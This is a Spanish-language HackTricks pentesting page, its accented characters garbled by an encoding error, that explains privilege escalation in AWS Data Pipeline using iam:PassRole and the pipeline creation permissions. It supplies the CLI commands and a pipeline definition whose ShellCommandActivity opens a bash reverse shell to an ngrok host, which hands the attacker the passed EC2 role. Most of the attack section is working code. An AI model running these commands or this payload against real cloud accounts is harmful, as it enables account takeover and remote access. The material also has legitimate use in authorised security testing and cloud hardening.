# AWS - Escalada de privilegios en Datapipeline

<details>

<summary><strong>¬°Apoya a HackTricks y obt√©n beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).

</details>

## Datapipeline

Para obtener m√°s informaci√≥n sobre Datapipeline, consulte:

{% content-ref url="../aws-services/aws-datapipeline-codepipeline-codebuild-and-codecommit.md" %}
[aws-datapipeline-codepipeline-codebuild-and-codecommit.md](../aws-services/aws-datapipeline-codepipeline-codebuild-and-codecommit.md)
{% endcontent-ref %}

### `iam:PassRole`, `datapipeline:CreatePipeline`, `datapipeline:PutPipelineDefinition`, `datapipeline:ActivatePipeline`

Un atacante con los permisos **`iam:PassRole`, `datapipeline:CreatePipeline`,  `datapipeline:PutPipelineDefinition,`** y **`datapipeline:ActivatePipeline`** podr√≠a escalar privilegios mediante **la creaci√≥n de un pipeline y la actualizaci√≥n del mismo para ejecutar un comando AWS CLI arbitrario o crear otros recursos**, ya sea una vez o en un intervalo con los permisos del rol que se pas√≥.

```bash
aws datapipeline create-pipeline --name my_pipeline \
    --unique-id unique_string
```

Lo que crear√° un pipeline vac√≠o. El atacante luego necesita **actualizar la definici√≥n del pipeline** para decirle qu√© hacer, con un comando como este:

```json
{
     "objects": [
     {
         "id" : "CreateDirectory",
         "type" : "ShellCommandActivity",
         "command" : "bash -c 'bash -i >& /dev/tcp/8.tcp.ngrok.io/13605 0>&1'",
         "runsOn" : {"ref": "instance"}
     },
     {
         "id": "Default",
         "scheduleType": "ondemand",
         "failureAndRerunMode": "CASCADE",
         "name": "Default",
         "role": "assumable_datapipeline",
         "resourceRole": "assumable_datapipeline"
     },
     {
         "id" : "instance",
         "name" : "instance",
         "type" : "Ec2Resource",
         "actionOnTaskFailure" : "terminate",
         "actionOnResourceFailure" : "retryAll",
         "maximumRetries" : "1",
         "instanceType" : "t2.micro",
         "securityGroups" : ["default"],
         "role" : "assumable_datapipeline",
         "resourceRole" : "assumable_ec2_profile_instance"
     }]
}
```

{% hint style="info" %}
Tenga en cuenta que el **rol** en **la l√≠nea 14, 15 y 27** debe ser un rol **asumible por datapipeline.amazonaws.com** y el rol en **la l√≠nea 28** debe ser un **rol asumible por ec2.amazonaws.com con un perfil EC2 de instancia**.

Adem√°s, la instancia de EC2 solo tendr√° acceso al rol asumible por la instancia de EC2 (por lo que solo se puede robar ese rol).
{% endhint %}

```
aws datapipeline put-pipeline-definition --pipeline-id unique_string \
    --pipeline-definition file:///path/to/my/pipeline/definition.json
```

Donde el **archivo de definici√≥n del pipeline contiene una directiva para ejecutar un comando** o crear recursos utilizando la API de AWS que podr√≠a ayudar al atacante a obtener privilegios adicionales.

**Impacto potencial:** Escalada directa de privilegios al rol de servicio de EC2 especificado.